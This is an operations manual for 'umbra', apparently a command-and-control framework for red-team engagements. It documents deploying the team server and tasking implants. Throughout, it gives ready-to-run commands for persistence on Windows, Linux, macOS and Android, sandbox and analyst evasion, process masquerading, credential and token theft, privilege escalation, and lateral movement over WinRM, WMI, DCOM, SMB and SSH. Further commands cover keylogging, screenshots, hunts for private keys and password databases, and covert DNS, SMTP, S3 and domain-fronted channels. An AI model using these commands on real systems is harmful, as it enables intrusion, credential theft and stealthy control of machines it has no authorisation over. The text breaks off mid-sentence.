# Operations

## 1. First deployment

```bash
# 1. secrets (agent PSK and per-operator tokens are independent)
./scripts/gen-secrets.sh alice bob
#  -> export UMBRA_AGENT_PSK=...
#  -> export UMBRA_OPERATOR_TOKENS=alice:...,bob:...

# 2. configuration
install -d -m 700 /etc/umbra /var/lib/umbra
install -m 600 deploy/server.prod.json   /etc/umbra/server.json
install -m 600 /dev/stdin /etc/umbra/agent.psk <<< "$UMBRA_AGENT_PSK"
printf 'UMBRA_OPERATOR_TOKENS=%s\n' "$UMBRA_OPERATOR_TOKENS" > /etc/umbra/server.env
chmod 600 /etc/umbra/server.env

# 3. service
install -m 644 deploy/umbra-server.service /etc/systemd/system/
systemctl daemon-reload && systemctl enable --now umbra-server
journalctl -u umbra-server -f
```

The server prints a fingerprint (first 16 hex chars of SHA-256) for every
operator token it loads — never the token itself. If a fingerprint is missing,
the token env var is not visible to the unit.

## 2. Listener layout

| Listener | Default | Exposure |
|---|---|---|
| `agent_listen` | `0.0.0.0:4001` | reachable by implants (TCP beacon, pivot callbacks) |
| `operator_listen` | `127.0.0.1:4002` | **never** public; reach it through SSH or WireGuard |
| `http_listen` | `127.0.0.1:4003` | behind the tunnel-facing proxy (`deploy/nginx-http-transport.conf`); also serves the WebSocket upgrade |
| `tls_listen` | *(empty)* | mutual TLS: agents and operators that present a client certificate |
| `dns_listen` | *(empty)* | the DNS tunnel (UDP); only answers for `dns_domain` |
| `vpn_listen` | *(empty)* | the layer-3 tunnel (UDP) |
| `socks_listen` | *(empty)* | the persistent SOCKS5 proxy through `socks_agent` |

`server.http_tls_cert` / `http_tls_key` make the Go listener itself serve TLS.
Leave them empty for beacons: an implant has no TLS stack, so only a TLS-speaking
relay could use that listener. The supported shape is tunnel → plain listener.

The beacons speak plain TCP and plain HTTP/1.1, so **TLS termination in front
of them does not work** — a plaintext client cannot complete a TLS handshake.
When implants must cross an untrusted network, put the transport inside an
encrypted tunnel (WireGuard, IPsec, an mTLS mesh) and keep the listener bound
to the tunnel interface. The frames are individually AEAD-sealed, so a tunnel
is about hiding *traffic shape* (ports, cadence, sizes), not about protecting
payload contents.

The operator console is the exception: it has a TLS stack, so a remote console
can use the mutual TLS listener:

```bash
umbra --server c2.example.com:4002 --operator alice --tls \
      --tls-ca /etc/umbra/ca.pem --tls-server-name c2.example.com \
      --tls-cert /etc/umbra/console.pem --tls-key /etc/umbra/console.key \
      --watch
```

`tls_listen` refuses to start without `tls_cert`, `tls_key` and
`tls_client_ca`: the listener is mutual TLS, so a client certificate is
mandatory and a stolen token alone is not enough to take over an operation.

## 3. Operator workflow

```bash
export UMBRA_OPERATOR_TOKEN='<your token>'      # or --token-file
umbra --server 127.0.0.1:4002 --operator alice --watch

umbra[-]> agents
umbra[-]> use web-01
umbra[web-01]> run whoami
umbra[web-01]> exec sysinfo
umbra[web-01]> sleep 120 40        # slow the beacon down
umbra[web-01]> tasks 10
umbra[web-01]> kill                # ask the beacon to exit
```

Scripted use (CI, reports):

```bash
umbra --server 127.0.0.1:4002 --operator alice agents
umbra --server 127.0.0.1:4002 --operator alice task web-01 shell \
      --args '{"cmd":"uname -a"}' --wait
umbra --server 127.0.0.1:4002 --operator alice result t-1a2b3c4d
```

`--token` shows up in the process list; prefer `--token-file` or the environment.

## 3a. Working on groups of agents

An engagement is rarely about a single machine.  The console therefore speaks
one filter language everywhere, and every command that acts on more than one
agent takes the same selection.

```bash
# what is out there?
umbra agents
umbra agents --state online --os windows
umbra agents --tag finance --transport http

# label the hosts, so the next command can find them
umbra tag web-01 finance dc-01
umbra tag web-01 legacy --remove
umbra tag web-01 prod staging --set

# act on the group
umbra task --agents web-01,web-02 --kind shell --args '{"cmd":"whoami"}'
umbra task --filter state=online,tag=finance --kind sysinfo
```

The filter keys are `state`, `transport`, `os`, `arch`, `tag` and `user`; the
same keys work in the RPC (`agents.list`) and in the interactive console
(`agents state=online tag=finance`).

**A selection is always explicit.**  `task.bulk`, `agents.tag` and
`agents.policy` refuse to run without either a list of agent ids or a filter:
a command that quietly applies to every agent in the inventory is not
recoverable once it is sent, so the server asks for a target instead of
guessing one.

The interactive console understands the same verbs:

```
umbra[-]> agents state=online
umbra[-]> tag web-01 finance
umbra[-]> policy web-01 sleep=120 jitter=45
```

## 3b. Interactive sessions, chains and alerts

### An interactive session

A session is a process on the target that the operator types into.  The
beacon keeps it open, streams what the process prints and takes what the
operator writes:

```bash
umbra session web-01                     # the platform's own shell
umbra session web-01 --cmd "python3"    # a specific program
umbra session web-01 --input "id"       # write one line and wait
```

Inside the console the same thing is one command: `session [cmd]`.  The
session survives a re-connect, so it keeps working when the check-in
interval is a minute; the beacon holds the connection open while a session is
live, so the output arrives as it happens instead of at the next check-in.

The sessions that are open are listed on their own, so an operator who
lost one can see that it is still there and when it last said something:

```bash
umbra sessions
```

### A multi-stage task

A chain runs several tasks one after the other, and the output of a stage
becomes the input of the next one.  `{{output}}` is the placeholder:

```bash
umbra chain web-01 --stages '[
  {"kind":"shell","args":{"cmd":"ls /etc/umbra"}},
  {"kind":"shell","args":{"cmd":"cat {{output}}"}}
]'
```

A chain is the shape of most real work: look, read, send.  The stages are
ordinary tasks in the history, so the console can still show what each stage
did.

### Alerts

The server can watch its own event stream, so a console does not have to:

```json
"alerts": [
  {"name": "dc-offline", "event": "agent.offline", "tag": "dc", "cooldown_s": 300},
  {"name": "failed-task", "event": "task.result", "task_kind": "bof", "cooldown_s": 60}
]
```

A rule matches on the event kind, on a tag of the agent, on the beginning of
the agent id and on the kind of the task.  When it matches, the server logs
the event loudly and pushes an `alert` event, which the console shows like
any other event.  The cooldown keeps a noisy agent from alerting on every
check-in.  `umbra alerts` lists the rules the server is using.

### Keeping the implant alive

```bash
umbra persist web-01                     # install it so it survives a reboot
umbra persist web-01 --method registry.run   # a specific technique
umbra persist web-01 --name "Update Service" # a label that says nothing
umbra unpersist web-01                   # take every start-up entry away again
umbra update web-01 /tmp/umbra-beacon --sha256 <digest>
```

The persistence is a manager around a catalogue of techniques, not one
scheduled task.  `--method auto` lets the manager pick the quietest one the
host can carry without administrator rights; naming a technique asks for
that one:

| Platform | Techniques |
|---|---|
| Windows | `registry.run`, `registry.runonce`, `registry.explorer_run`, `registry.winlogon`, `registry.ifeo`, `registry.appinit`, `registry.com`, `registry.printmonitor`, `registry.shell_ext`, `schtasks`, `taskxml`, `service`, `startup`, `bcdedit` |
| Linux | `systemd.user`, `systemd.system`, `systemd.timer`, `cron.user`, `cron.d`, `rc.local`, `init.d`, `profile`, `ld_preload`, `xdg_autostart`, `at` |
| macOS | `launchd.agent`, `launchd.daemon`, `loginitem`, `shell_rc`, `cron.user` |
| Android | `boot_receiver`, `foreground_service`, `alarm` |

Three things make the difference between a start-up entry and a persistence
engine:

* **It is verified.**  The manager reads the entry back after installing it
  (the registry value, the unit file, the crontab line, the scheduled task)
  and reports the truth.  An entry that cannot be read is a failure, not a
  success.
* **It is idempotent.**  Installing twice leaves exactly one entry, and the
  manager keeps its own record of what it installed, so it knows what to
  check and what to remove weeks later.
* **It is quiet.**  The implant copies itself into a plausible location and
  the entry points at that copy; the label becomes the value name, the
  service display name and the task name.  The install prints nothing on the
  target unless `--verbose` is asked for.

The lifecycle is visible to the operator:

```bash
umbra persist-list web-01                # what is installed on the host
umbra persist-verify web-01              # read every entry back
umbra persist-health web-01              # covered, degraded or broken
umbra persist-migrate web-01 --from registry.run --to schtasks
umbra persist-report                     # the whole fleet
```

`persist-migrate` installs the new technique and verifies it *before* the
old one is removed, so the coverage never has a gap.  `persist-report` is
the handover artefact: it lists the hosts that carry an entry, the entries
that are broken and the techniques that have to be removed when the
engagement ends.  `engagement.wipe` clears the record of the engagement on
the server; it deliberately does not touch the hosts, because somebody has
to remove what was installed there.

The update replaces the running binary: the new one is pushed to the host
first (the `upload` task), the digest is checked, and only then is the old
binary swapped out.  An implant that installs a file nobody verified is an
implant that installs whatever the network sent it.

### Knowing the host

The implant knows what the host looks like, and the operator should know it
too.  The posture engine answers four questions — virtual or real, a
workstation or a server, a developer's box or a plain machine, a lab
machine or a production one — and says how sure it is:

```bash
umbra evade-report                      # the posture of the whole fleet
umbra evade-report web-01              # the posture of one host, from the host
umbra evade-posture web-01 --no-silence --sandbox-factor 300
umbra evade-profile web-01 --base 90 --busy-start 8 --busy-end 18
umbra evade-shape web-01 --mode fixed --size 2048 --reorder
umbra evade-killswitch web-01 --file /tmp/stop-the-implant
umbra evade-killswitch web-01 --uptime 72
umbra evade-killswitch web-01 --clear
```

`evade-report` without an agent reads the record the server keeps, so the
whole fleet is one command and no host is touched.

**The artefacts are not a blacklist.**  Every artefact the engine finds
carries a class, a severity and a confidence: a virtual machine is a hint
(most companies run them), a sandbox that injects itself into every process
is nearly a proof, and an analyst's debugger is a proof.  The engine
reports; the operator decides.

**What the posture changes.**  The sleep interval is multiplied with the
factor of the posture, the jitter is raised, and — only when the operator
armed it — the implant stops answering on a host that looks like an
analyst's sandbox.  The defaults are conservative: the implant adapts to
its environment, but it never falls silent on its own.

**The day.**  `evade-profile` replaces the flat interval with a schedule:
busy while the office is open, quiet at night, lazier at the weekend.  The
factors are percentages of the base interval.

**The shape of the traffic.**  `evade-shape` chooses the size bucket of
the frames (`off`, `random`, `fixed`) and may shuffle the order of the
operations inside a cycle.

**The kill switch.**  The blast radius is the operator's decision:
`--file`, `--registry`, `--at`, `--uptime` and `--marker` are the
triggers.  When the trigger fires, the implant removes its own persistence
entries, wipes its state and stops — the machine is left the way it was
found.  The panic task of the server is the sixth trigger, and it needs no
arming: `agents.panic` and the ordinary `exit` task take the persistence
entries with them, so the last word of the operator always leaves the
target clean.

**The hygiene.**

```bash
umbra hygiene web-01 --memory            # what holds a secret, and what was wiped
umbra hygiene web-01 --copy /opt/app/update-agent --cwd /opt/app
umbra hygiene web-01 --name updater --clean-env
```

The memory of the implant is cleaned on the way out: the key material, the
keystrokes, the credentials and the module images live in guards that wipe
themselves, including on the path where the work failed.  The process is
cleaned as well: the implant can run under a copied name, in a plausible
directory, with an environment that says nothing about the tool, and — on
Windows — with the parent it claims to have.

### The material and the vault

Everything the implant finds about an identity is a record: a kind, a
source, an account, a target and a confidence.  The value of the material
only leaves the host when the operator asks for it, and it only leaves the
server when the operator asks for that.

```bash
umbra task web-01 --kind creds --args '{"mode":"all"}'     # the shape of the material
umbra task web-01 --kind creds --args '{"mode":"all","raw":true}'
umbra creds-list                                        # the vault of the engagement
umbra creds-list --kind hash --agent web-01
umbra creds-search svc-sql01                           # search the account, the target and the note
umbra creds-export --kind password                     # the value (operator role)
```

The rules are short:

* The **event stream never carries a secret**.  The task record and the
  `creds.collected` event keep the shape of the material; the value goes to
  the vault.
* The vault is **encrypted at rest** when the server has a key.  Set
  `vault_key` in the configuration, or `UMBRA_VAULT_KEY` in the
  environment.  Without a key the server keeps the digest and drops the
  value: an operator still sees what was found and where, but the value is
  not kept anywhere.
* The **digest is always kept**, so two hosts that share a credential can
  be seen to share it without the key.
* `creds-export` is an **operator** action, and the console asks for the
  value only when the operator asked for it.

**The token work.**

```bash
umbra task web-01 --kind token --args '{"mode":"list"}'
umbra task web-01 --kind token --args '{"mode":"list","session":1}'
umbra task web-01 --kind token --args '{"mode":"impersonate","pid":1180}'
umbra task web-01 --kind token --args '{"mode":"become","pid":1180}'
umbra task web-01 --kind token --args '{"mode":"restore"}'
```

`impersonate` borrows the account of a process for the next task and gives
it back when the task is done; `become` keeps it until the operator sends
`restore`.  The identity travels with the check-in, so the inventory shows
the truth, and the server drops it when the session of the agent ends.

**The privilege escalation.**  Every attempt is reported on its own — the
technique, the outcome and what it changed on the host:

```bash
umbra task web-01 --kind privesc --args '{"mode":"privileges"}'
umbra task web-01 --kind privesc --args '{"mode":"token"}'
```

**The domain.**  The reconnaissance now carries the edges that matter for
movement: the trusts of the domain, the accounts that may delegate, the
groups and their members, the machine accounts, and the permissions that
give a principal the full control, the right to write the permissions or
the right to replicate the directory.

### Running a command on a far host

The implant does not need a new tunnel to reach a far host: the agent that
holds the network path runs the command there, with its own credentials and
its own reach.  The output comes back through that same agent.

```bash
umbra task pivot-01 --kind winrm.exec --args '{"target":"dc01","command":"whoami"}'
umbra task pivot-01 --kind wmi.exec   --args '{"target":"dc01","command":"net user"}'
umbra task pivot-01 --kind dcom.exec  --args '{"target":"web01","command":"ipconfig"}'
umbra task pivot-01 --kind smb.exec   --args '{"target":"web01","command":"hostname"}'
umbra task pivot-01 --kind ldap.query --args '{"target":"dc01","command":"user"}'
umbra task pivot-01 --kind ssh.exec   --args '{"target":"10.0.0.9","command":"id","user":"root"}'
```

Every one of them cleans up after itself: the remote file, the remote task
and the remote service are removed as soon as the output has been read.  The
protocol that does not return the output itself (`wmi`, `dcom`, `smb`) reads
it back over the administrative share of the target.

### Keeping the implant reachable

The beacon can know more than one address of the team server:

```bash
UMBRA_SERVERS=10.0.0.5:4001,10.0.0.9:4001 UMBRA_PROXY=127.0.0.1:1080 ...
```

When the first address is down, the beacon tries the next one, so a server
that moves does not take the implant with it.  `UMBRA_PROXY` routes the
connection through a SOCKS5 proxy, for a network that only lets a proxy out.

### The processes

```bash
umbra proc web-01
umbra proc-kill web-01 4321
umbra proc-kill web-01 whoami
```

The table is the operating system's own: the pid, the parent, the user, the
moment the process started and the exact command line.  A shell tool hides
most of that, and it is exactly what an operator asks about when a host
behaves strangely.

### The command namespace

The server ships with a small namespace of saved commands, so a team says
`whoami` instead of remembering the exact task arguments:

| alias | what it does |
| --- | --- |
| `whoami`, `hostname` | the identity of the implant and the name of the host |
| `system`, `processes`, `network` | the system information, the processes, the network |
| `listening`, `routes`, `services` | the sockets, the routing table, the services |
| `screenshot` | a picture of the desktop |
| `triage`, `find` | the file triage and the file search |

```bash
umbra alias list
umbra alias run web-01 whoami
umbra alias run web-01 triage --args '{"path":"/etc/passwd"}'
umbra alias run web-01 find --arg name="*.kdbx" --arg path=/home
```

An alias may also point at an armory extension instead of a task kind, which
is what makes the namespace extensible at runtime.  The team can add its own
(`umbra alias add ...`) and replace the built-in ones.

### Doing it again

A task that failed for a reason that is gone now can be run again:

```bash
umbra tasks --state failed
umbra retry t-1a2b3c4d
```

The old record stays as the history of what went wrong, and the new task is
what the agent runs.  A task that is still queued or delivered cannot be
retried: a delivered task may still be running, and running it twice is worse
than not running it.

### The handover

At the end of an engagement somebody has to write down what was done and
what was found.  The console writes it:

```bash
umbra report web-01 --out web-01.md     # one host
umbra report --all --out engagement.md   # the whole engagement
```

The report holds the host's record, the tasks that were run on it and the
notes of the local notebook, as one Markdown document.  The engagement
report holds every host and every task, which is the document that goes
with the handover.

The output of a task is often a file — a digest list, a dump, a log — so
`umbra result <task-id> --out out.bin` writes it whole instead of printing
it.

### Finding things on the target

```bash
umbra triage web-01 /usr/bin/suspicious     # size, digest, format, entropy
umbra find web-01 "*.kdbx" --path /home     # by name (a glob or a substring)
umbra find web-01 --content "BEGIN PRIVATE KEY" --path /etc
umbra netinfo web-01                        # interfaces, routes, neighbours
umbra tail web-01 /var/log/auth.log --lines 50   # what a log says right now
umbra hash web-01 /usr/bin/suspicious       # the SHA-256 of a file
umbra proc web-01                           # the process table
umbra proc-kill web-01 4321                 # a process, by pid or by name
umbra keylog-file web-01 /tmp/keys.log --seconds 300   # the keys, to be fetched later
umbra registry win-01 "SOFTWARE\Microsoft" --hive HKLM  # the Windows registry
umbra screenshot web-01 screen.png          # the screen of the target
umbra clipboard web-01                      # the clipboard of the target
umbra env web-01 --filter TOKEN            # the environment of the target
umbra resolve web-01 db.internal           # where a name points at
umbra scan web-01 10.0.0.0/29 --ports 22,80,443   # who answers
umbra touch web-01 /tmp/marker             # create a file and stamp it
```

The scan is a plain TCP connect: it says which hosts answered, it does not
read a banner and it does not touch the service it finds.  The range is
expanded by the beacon itself, and the number of addresses is capped, so a
`/8` cannot turn into sixteen million connect attempts.

`umbra env` is worth a look early on every host: the environment of a
service account holds the paths, the endpoints and the tokens that the
process itself uses.

## 3c. The dashboard

The console is the tool of the day.  The dashboard is what a team leaves open
on a second screen: the inventory, the running tasks and the event stream,
without a terminal in the way.

```json
{ "dashboard_listen": "127.0.0.1:8080", "dashboard_read_only": false }
```

Open `http://127.0.0.1:8080/` and paste an operator token.  The dashboard
accepts the same tokens as the console, so it is exactly as protected: the
token is compared in constant time and is never written to a log.

It is deliberately small.  It shows what is there and it queues a task;
everything else (the pivots, the team chat, the extension store) stays in
the console, where the answers are reviewed before they are given.  With
`dashboard_read_only` the task button is refused, which is what a dashboard
on a screen somebody walks past should be.

The endpoints it serves:

| endpoint | what it answers |
| --- | --- |
| `GET /api/agents` | the inventory |
| `GET /api/tasks?agent=&kind=&state=&limit=` | the task history |
| `GET /api/events?after=&limit=` | the journal of the events |
| `GET /api/stats` | the counters of the server |
| `POST /api/task` | `{"id": ..., "kind": ..., "args": {...}}` queues a task |

The dashboard is a **local** listener by default.  Putting it on a public
address means putting the operator token on a public address as well, and
that is a decision an operator makes on purpose, not one a default makes
for them.

## 3d. The artifact store

The team server keeps files: a payload, a configuration, a tool.  The
operator puts a file into the store once and pushes it to every host that
needs it, instead of uploading the same bytes again for every machine.

```bash
umbra artifact list                                    # what the server holds
umbra artifact put payload.bin --file ./payload.bin    # once
umbra artifact push payload.bin web-01 --path /tmp/payload.bin
umbra artifact get payload.bin --file ./payload.bin    # back again
umbra artifact remove payload.bin
```

The store is content addressed: the blob is written under the SHA-256 of its
contents, so two uploads of the same file share one copy on disk, and the
digest is shown with the entry.  `umbra artifact list` prints it.

A push is not a new beacon command.  The server builds a chain of ordinary
`upload` tasks, one per chunk, and the beacon writes them one after the
other; the last chunk closes the file and answers with the SHA-256 of the
whole file, so the operator can check the copy on the target against the
copy in the store.  A chunk that fails stops the chain instead of leaving a
hole in the file.

The uploads are chunked because the frames are bounded: 256 KiB per request,
which always fits in one frame with room to spare.  The store lives next to
the state file (`<data dir>/artifacts`), so a deployment that already gives
the server a writable data directory needs no extra setup.

## 3e. The reach

A pivot is a door into a network.  The server does not hold the door: the
agent does, the server only drives it, and the picture of every door is
written down so the team can see what is open before it is used.

### The picture

```bash
umbra pivot list                 # every tunnel: agent, mode, listener, target
umbra pivot list --json          # the same, for a script
```

The list is a graph, not a table of ports:

| Field | What it says |
|---|---|
| `agent_id` | the agent that holds the tunnel |
| `through` | the agent the tunnel runs through, when it is a chained pivot |
| `mode` | `socks` (a proxy) or `forward` (a fixed target) |
| `listen` | the address and port the team connects to |
| `host` / `port` | the target of a forward |
| `streams` | how many connections are open through it right now |
| `bytes_up` / `bytes_down` | what has moved through it |
| `last_active` | when something last moved (a unix stamp) |
| `state` | `open`, `closed` or `waiting` |
| `claim` | the name of the claim the tunnel belongs to |
| `dns` | `remote` (the agent resolves the name) or `local` (the server does) |
| `path` | the chain of hops the server walked to reach the target |

The dashboard draws the same thing: the "reach" panel shows the agents as
nodes and the pivots as edges, so a chained pivot is visible as a line that
starts at one agent and ends at another.

### The route of an agent

The operator knows the network of the target; the beacon does not.  "This
agent only speaks DNS", "that one goes through a front domain", "the third
one sits behind a proxy that reads the traffic" is written down as the
*route* of the agent, and the server pushes it with the task batch.

```bash
# this agent speaks DNS first and falls back to TCP
umbra transport set agent-01 --primary dns --fallback tcp

# this one speaks WebSocket through a front domain
umbra transport set agent-02 --primary ws --fallback http,tcp --front cdn.example.com

# the proxy in front of it reads the traffic
umbra transport set agent-03 --primary tcp --inspect

umbra transport get agent-02      # the route of one agent
umbra transport list              # the routes of every agent that has one
```

The beacon follows the route from the next cycle on: the transport it
speaks is the one the operator named, and the fallback order is the one the
operator wrote.  A transport the framework does not know is refused at the
console, not pushed to the beacon.

### The chain

A pivot can run through other pivots.  The operator names the far end; the
server resolves the road from the addresses the beacons reported:

```bash
# server -> agent-01 -> agent-02 -> target
umbra pivot open agent-01 --mode socks --through agent-02

# a longer chain: every --through adds one hop
umbra pivot open agent-01 --mode socks --through agent-02 --through agent-03
```

The server asks the first agent for a stream to the next one, speaks the
peer handshake on it (PROTOCOL.md §7.3a) and continues over the peer link.
When the peer link of a hop cannot be established, the server takes that
hop over itself: the pivot keeps working and the traffic takes another
road.  The "reach" table shows the chain in the `path` column.

The beacons that wait for peers must serve their peer listener; the address
they wait on is reported to the server in the handshake, so nothing has to
be configured by hand:

```bash
umbra-beacon --server 10.0.0.5:4001 --peer-listen 0.0.0.0:9001
```

### The proxy

```bash
# a SOCKS5 proxy through one agent, with a name and a password
umbra pivot open agent-01 --mode socks --claim corp --user alice --password secret

# the proxy answers for the team, the name is resolved by the agent
curl --socks5-hostname alice:secret@127.0.0.1:1080 http://10.10.0.5/
```

The proxy speaks SOCKS5 with the username/password method (RFC 1929).  The
credentials belong to the tunnel, so two proxies can have two different
pairs and a listener can be closed without touching the others.  The server
compares them in constant time, so a wrong password does not leak its
length.

**Where the name is resolved.**  By default the name is handed to the agent
and resolved there (`--dns remote`): the agent is the one that can see the
internal resolver, and the server never learns the address.  With `--dns
local` the server resolves the name first and the agent gets an address.

**What the proxy refuses.**  The list of refused targets is a policy of the
deployment, not a runtime accident:

```json
{
  "pivot_deny": ["10.0.0.5", "10.0.0.0/24:445", "metadata.google.internal:80"]
}
```

A rule is `host` or `host:port`; without a port it refuses every port of
that host.  The host is compared against the name that was asked for, the
address the name resolves to, and — when the rule is a network — every
address inside it.  A rule for `10.0.0.5` therefore also covers the name
that points at it, and `169.254.0.0/16` refuses the whole link-local range
including the cloud metadata address.  A refused target is answered with
`0x02` (not allowed by ruleset) and it is written in the connection log, so
a refusal is visible in the audit trail.

**Who used it.**  Every connection is booked: the client address, the target,
the bytes in both directions, the time and the outcome.  The accounting is
per client, the log keeps the last 256 connections, and both are part of
`pivot.list`.  A proxy nobody used is different from a proxy that is in use,
and the difference should be visible without reading the packets.

### The forwards

```bash
# a fixed target
umbra pivot open agent-01 --mode forward --host 10.10.0.5 --port 445 --claim corp

# a listener that only the console may use
umbra pivot open agent-01 --mode forward --host 10.10.0.5 --port 445 --loopback
```

A forward is a listener on the server and a stream through the agent to one
target.  Several forwards can be open at the same time, each with its own
listener.  With `--loopback` the listener is bound to `127.0.0.1`: only the
machine the server runs on may use it, which is the safe default for a
forward that has no authentication of its own.

A forward survives the agent going away.  The listener stays bound, the
server waits for the agent to come back, and the next connection that
arrives is served by the new session.  The team does not have to rebuild the
forward after a sleep cycle or a network change.

### The claims

A claim is a name for a group of tunnels.  It is the unit of "this belongs
to the operation on the corporate network" and the unit of "tear it all
down":

```bash
umbra pivot open agent-01 --mode socks --claim corp
umbra pivot open agent-02 --mode forward --host 10.10.0.5 --port 445 --claim corp
umbra pivot claims                   # what the claims hold
umbra pivot release corp             # every tunnel of the claim is closed
```

`pivot.release` closes the listeners, closes the streams and forgets the
claim; the accounting of what went through stays in the log.  Releasing a
claim needs the operator role; opening one needs the operator role as well,
and listing the reach needs only a viewer.

### The server configuration

| Key | What it does |
|---|---|
| `socks_listen` | a permanent SOCKS5 proxy through `socks_agent` |
| `socks_agent` | the agent that proxy runs through |
| `socks_user` / `socks_password` | the credentials of that proxy (RFC 1929) |
| `pivot_deny` | the targets the proxies refuse |

The permanent proxy and the pivots opened from the console share the same
deny list and the same accounting.

### The transports that keep no connection

Two transports do not keep a connection at all, and they are the answer to
a network where nothing else gets through:

| transport | the server needs | the beacon needs |
|---|---|---|
| `smtp` | `smtp_listen` and `pop3_listen` | the address of both |
| `s3` | `s3_listen` | the address of the endpoint |

```
{
  "smtp_listen": "0.0.0.0:25",
  "pop3_listen": "0.0.0.0:110",
  "s3_listen": "0.0.0.0:9000"
}
```

The operator then tells the agent which one it speaks:

```
umbra transport set <agent> --primary smtp
umbra transport set <agent> --primary s3
```

The mail transport uses the team key: the id of the agent is the user name
and the password is derived from the key, so nothing has to be configured
per agent.  The object transport uses the same password as the secret key
of the request and signs every request with AWS Signature Version 4, so the
same beacon can talk to a real bucket.

### The layer-3 tunnel

The tunnel is a transport of its own: a UDP socket, its own keys and its
own replay protection.  It keeps working when the beaconing channel does
not, so a host that can only send UDP out is still reachable.

The beacon joins the tunnel with the key it already has, so there is
nothing to distribute:

```
umbra vpn status
umbra vpn peers
```

The server hands out the addresses of the tunnel, and the operator may
send a whole network to one peer — the peer is then the gateway of it:

```
umbra vpn route laptop-1 192.168.5.0/24
umbra vpn routes
```

The counters of every route and every peer are in the same tables.

A peer that can only be reached through another agent joins the relay of
that agent instead of the server.  The relay carries the datagrams, and
the keys of the session stay between the peer and the server:

```
# on the agent that is in the middle
umbra vpn relay <agent> --

# on the peer that is behind it
umbra vpn start --addr <the relay of the agent in the middle>
```

The question of the operator travels through the tunnel and comes back
through it, so the answer says more than the bookkeeping of the server:

```
umbra vpn ping laptop-1
```

### A pivot on a named pipe

On a Windows server the pivot may listen on a named pipe instead of a TCP
socket.  Only a process of the host can open it, so nothing outside the
host reaches it.

```
umbra pivot open laptop-1 --mode socks --pipe
```

The reply carries the name of the pipe (`\\.\pipe\umbra-<tunnel>`), and
the operator opens it with the tools of the host:

```powershell
# the proxy of the pivot, read with the SOCKS5 client of the host
curl --socks5-hostname "\\.\pipe\umbra-tun-8f2a1c" http://10.0.0.5:8080/
```

### IPv6

A pivot may be opened on an IPv6 address, and a proxy may run on one:

```
umbra pivot open <agent> --mode socks --listen "[::1]:1080"
```

| What | IPv4 | IPv6 |
|---|---|---|
| a listener | `127.0.0.1:1080` | `[::1]:1080` |
| a target | `10.0.0.5:443` | `[2001:db8::5]:443` |
| a scan | `10.0.0.0/24` | `2001:db8::/120` |
| the SOCKS5 answer | `ATYP 0x01`, 4 bytes | `ATYP 0x04`, 16 bytes |

Three rules keep it working:

* an IPv6 literal is written in brackets, so `host:port` is never ambiguous;
* a listener that is forced onto the loopback keeps its family: an IPv6
  listener moves to `::1`, not to `127.0.0.1`;
* the answer of the SOCKS5 proxy carries the address of the listener, in the
  family of the listener.

The same rules hold in the implant: the transports dial an IPv6 literal
(`[::1]:8443`), the scan expands an IPv6 block, and the peer link binds an
IPv6 socket when it is asked for one.

## 4. Beacon tuning

The server dictates cadence at handshake time (`beacon.sleep` / `beacon.jitter`)
and can change it per agent with `agents.policy` (or the older
`agents.sleep`); the implant applies it immediately on the next check-in and
keeps it until it is told otherwise.

```bash
umbra policy web-01 --sleep 120 --jitter 45
umbra policy --all --state online --sleep 300 --jitter 50
umbra policy web-01 --no-obfuscate     # a fixed interval, no jitter nap
```

The cadence belongs to the operator: a beacon that has not applied a pushed
policy yet still reports its old interval, and that report never overwrites
the policy.  The obfuscation flag travels with the policy (the default is on,
so an agent keeps hiding its check-in pattern unless it is told otherwise).

| Environment | sleep | jitter |
|---|---|---|
| Lab / LAN | 5 s | 20 % |
| Typical engagement | 60 s | 35 % |
| Low-and-slow | 900 s | 50 % |

Sleep and jitter are clamped server-side (1–86400 s, 0–90 %). Failed cycles back
off exponentially up to 5 minutes, so a beacon never hammers a dead server.

## 5. State and recovery

* `data_file` holds agents and the task history (JSON). It is written after
  every state change, but bursts are coalesced into one write, and there is a
  periodic snapshot every 30 s as a backstop, plus a final write on shutdown.
  Each write goes to a fresh `*.tmp` in the same directory, is fsynced, and is
  renamed over the target, so the file on disk is always a complete snapshot
  (concurrent saves are serialised; a reader never sees a half-written file).
* Two generations on disk: before the new file is renamed into place, the
  current one becomes `data_file.bak`. A crash inside that window leaves no
  primary at all, so startup falls back to the backup and logs
  `state recovered from the backup generation` — the last few seconds of state
  are gone, the engagement is not. A torn or non-snapshot primary is treated the
  same way. `{}` or a file from a newer schema is refused instead of being
  loaded (and then overwritten) as an empty engagement.
* Anything that was `delivered` when the server stopped is re-queued on start, so
  a crash cannot lose a task — at the cost of possibly executing it twice. Task
  kinds are not idempotent by default, so check `task.list` after a restart.
* History is capped at 20 000 tasks (oldest completed tasks are pruned).
* A task that was delivered but never answered is failed after
  `task_timeout_s` (default 300 s, `0` disables it) and the consoles get a
  `task.timeout` event.  The task is **not** queued again: a task that may
  have run must not run a second time, so the operator decides what happens
  next.
* To reset an engagement: `umbra wipe` clears the agents, the tasks and the
  schedules on the server, and the audit trail keeps the numbers.  The
  implants are **not** touched: they are still out there, so remove them
  first.  A full reset (the file, the keys, everything) means: stop the
  server, delete `data_file`, **and rotate the agent PSK and operator
  tokens** (delete the implants or they will simply re-register).
* To end an engagement on the *target* side: `umbra panic` queues the exit
  task for the selected agents and marks them as burned, so the server
  refuses every further task for them — work that is queued while the
  operator is still cleaning up never reaches the machine.  The exit is a
  task, not a pushed frame, so an implant that sleeps for an hour gets it
  on its next check-in and dies then.  `umbra panic --all` reaches every
  agent the server knows, the sleeping ones included.  The console asks for
  the word "panic" before it does any of this, and the command is an admin
  action, so it is in the audit trail.
* A beacon that says which task kinds it implements is never asked for
  anything else: the server refuses the task and names the kind, instead of
  delivering a command the host cannot run.  The list is in the inventory
  (`umbra agents --json`), and it is what tells an operator that a host is
  out of scope before the command is written.

## 5a. The operator's notebook

The team server keeps the authoritative state. The console keeps a second,
local copy of the part of the history that belongs to the operator: the tasks
they ran, the results they collected and the notes they left for the team.
It is a single SQLite file, `~/.umbra/state.db` by default.

```bash
umbra db stats                     # how much is in the notebook
umbra db tasks                     # the tasks this console submitted
umbra db tasks --agent web-01      # only the ones for one implant
umbra db results <task-id>         # the output of one task
umbra db search "shadow"           # search arguments, notes and output
umbra db note "the DC is dc01.corp.example" --agent web-01
umbra db export engagement.json     # a portable copy of the notebook
```

The notebook needs no server and no token: `umbra db ...` works offline, which
is exactly what an operator wants when the server is down or when the
question is about something that happened yesterday.

Two properties matter:

* **no secrets.** The operator token, the agent PSK and the session keys stay
  in memory. The notebook holds task metadata and task output — the same
  material the server already stores — and nothing else.
* **the operator owns it.** The file is not part of the server state, is not
  synchronised with the team, and is not touched by anybody else. Deleting it
